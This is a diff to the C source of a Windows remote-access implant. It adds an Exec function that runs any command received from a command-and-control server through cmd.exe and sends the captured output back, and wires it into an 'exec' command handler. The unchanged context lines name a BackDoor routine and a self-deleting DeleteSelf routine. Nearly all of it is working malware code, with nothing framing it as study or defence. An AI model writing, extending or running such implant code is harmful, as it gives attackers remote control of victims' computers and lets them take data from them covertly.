@@ -345,6 +345,70 @@ end:
 }
 
 
+// Execute a shell command by spawning cmd.exe
+// Based on https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
+DWORD Exec(char* command) {
+    char fullCommand[2048];
+    char* output = NULL;
+    DWORD bytesRead = 0;
+
+    STARTUPINFO startInfo;
+    PROCESS_INFORMATION procInfo;
+    HANDLE pipe_read = NULL;
+    HANDLE pipe_write = NULL;
+    SECURITY_ATTRIBUTES saAttr;
+
+    DWORD status;
+    DWORD ret = 0;
+
+    // Create pipe to capture output
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+    if (!CreatePipe(&pipe_read, &pipe_write, &saAttr, 0)) {
+        c2_log("[!] CreatePipe failed\n");
+        return -1;
+    }
+
+    // Set up process structures
+    ZeroMemory(&startInfo, sizeof(startInfo));
+    startInfo.cb = sizeof(startInfo);
+    startInfo.hStdError = pipe_write;
+    startInfo.hStdOutput = pipe_write;
+    startInfo.dwFlags |= STARTF_USESTDHANDLES;
+
+    // Execute
+    sprintf(fullCommand, "cmd.exe /C %s", command);
+    status = CreateProcess(NULL, fullCommand, NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo);
+    if (!status) {
+        c2_log("[!] Exec failed\n");
+        CloseHandle(pipe_write);
+        CloseHandle(pipe_read);
+        return -1;
+    }
+    c2_log("[+] Exec success\n");
+    WaitForSingleObject(procInfo.hProcess, INFINITE);
+    
+    // Close write end of pipe (we only need read access)
+    CloseHandle(pipe_write);
+    pipe_write = NULL;
+
+    // Allocate memory for output
+    output = (char*) Malloc(100 * 1000); // 100 Kb
+    ReadFile(pipe_read, output, 100*1000, &bytesRead, NULL);
+
+    // Send to server
+    c2_send(output, bytesRead);
+
+    // Cleanup
+    CloseHandle(procInfo.hProcess);
+    CloseHandle(procInfo.hThread);
+    CloseHandle(pipe_read);
+
+    return 0;
+}
+
+
 // Ends the process and deletes the binary
 void DeleteSelf() {
     char path[MAX_PATH];
@@ -507,6 +571,11 @@ int main() {
             status = BackDoor();
             if (status == 0) { c2_send("[+] Sucess", 10); }
             else { c2_send("[!] Error", 9); }
+        }
+
+        else if (strncmp(buffer, "exec ", 5) == 0) {
+            status = Exec(buffer + 5);
+            if (status != 0) { c2_send("[!] Error", 9); }
         }
 
         else {
